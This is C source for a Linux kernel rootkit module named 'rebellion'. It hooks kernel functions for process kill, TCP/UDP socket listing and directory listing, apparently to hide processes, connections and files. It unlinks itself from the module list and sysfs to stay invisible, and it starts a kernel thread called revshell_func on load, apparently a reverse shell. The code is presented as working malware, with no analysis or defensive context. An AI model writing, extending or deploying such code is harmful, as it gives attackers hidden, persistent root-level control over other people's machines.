#include "config.h"
#include "hooks/kill.h"
#include "hooks/tcpX_seq_show.h"
#include "hooks/udpX_seq_show.h"
#include "hooks/filldir.h"
#include "hooks/icmp_rcv.h"

#ifdef __x86_64__
#define SYSTEM_ARCH(s) "__x64_" s
#else
#define SYSTEM_ARCH(s) s
#endif

static struct ftrace_hook hooks[] = {
    HOOK(SYSTEM_ARCH("sys_kill"), kill_hook, &original_kill),
    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &original_tcp4_seq_show),
    HOOK("tcp6_seq_show", tcp6_seq_show_hook, &original_tcp6_seq_show),
    HOOK("udp4_seq_show", udp4_seq_show_hook, &original_udp4_seq_show),
    HOOK("udp6_seq_show", udp6_seq_show_hook, &original_udp6_seq_show),
    // HOOK("icmp_rcv", icmp_rcv_hook, &original_icmp_rcv), // Removed - using automatic execution instead
    HOOK("filldir", filldir_hook, &original_filldir),
    HOOK("filldir64", filldir_hook, &original_filldir)
};

void hideModule(void) {
	if (isModuleHidden == TRUE) {
        return;
    }

	modPrevious = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	modKOBJPrevious = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	isModuleHidden = TRUE;
}
 
void showModule(void) {
	int result;

	if (isModuleHidden == FALSE) {
        return;
    }

	list_add(&THIS_MODULE->list, modPrevious);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULENAME);
	isModuleHidden = FALSE;
}

// Process hiding helper functions
int add_hidden_pid(pid_t pid) {
    int i;
    
    // Check if PID is already hidden
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            return 0; // Already hidden
        }
    }
    
    // Add PID if there's space
    if (hidden_pid_count < HIDE_PID_LIST_SIZE) {
        hidden_pids[hidden_pid_count] = pid;
        hidden_pid_count++;
        return 0;
    }
    
    return -1; // List is full
}

int remove_hidden_pid(pid_t pid) {
    int i, j;
    
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            // Shift remaining PIDs down
            for (j = i; j < hidden_pid_count - 1; j++) {
                hidden_pids[j] = hidden_pids[j + 1];
            }
            hidden_pid_count--;
            return 0;
        }
    }
    
    return -1; // PID not found
}

bool is_pid_hidden(pid_t pid) {
    int i;
    
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            return true;
        }
    }
    
    return false;
}

static int __init rebellion_init(void) {
    revshell_thread = kthread_run(revshell_func, NULL, "shell_thread");
    if (IS_ERR(revshell_thread)) {
        return PTR_ERR(revshell_thread);
    }

    int err; 
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit rebellion_exit(void) {
    if (revshell_thread) {
        kthread_stop(revshell_thread);
    }
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rebellion_init);
module_exit(rebellion_exit);
